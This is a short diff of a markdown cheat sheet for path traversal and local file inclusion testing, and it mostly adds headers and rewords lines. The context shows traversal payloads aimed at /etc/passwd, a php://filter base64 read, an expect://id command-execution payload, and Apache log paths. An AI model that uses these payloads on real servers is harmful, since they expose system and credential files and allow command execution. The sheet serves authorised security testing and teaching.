@@ -1,4 +1,5 @@
 ***
+### Path Traversal General Testing
 - Identify a urls such as
 	- `example.com/image?filename=img.jpg`
 	- `example.com/getUserProfile.jsp?item=ikki.html`
@@ -31,6 +32,7 @@
 	- `a/../../../../[ADD MORE]../../../../../etc/passwd`
 		*This vulnerability was corrected in PHP 5.3*
 ***
+### Paths to test with LFI
 Interesting files to find on Linux system:
 **OS Version**
 ```
@@ -111,9 +113,9 @@ php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 expect://id
 ```
-## Possible log paths
+## Possible log/system/database paths
 ----
-Simple collection of paths:
+**Simple collection of paths:**
 ```
 /var/log/apache2/access.log
 /var/log/apache/access.log
@@ -128,7 +130,7 @@ Simple collection of paths:
 
 Spray and pray
 - In some cases, a combination of attacks or bypasses is needed
-- Don forget there is a couple path that require a change brute force is not the key  
+- Mindless brute force is not the key 
 
 **Apache Linux**
 ```
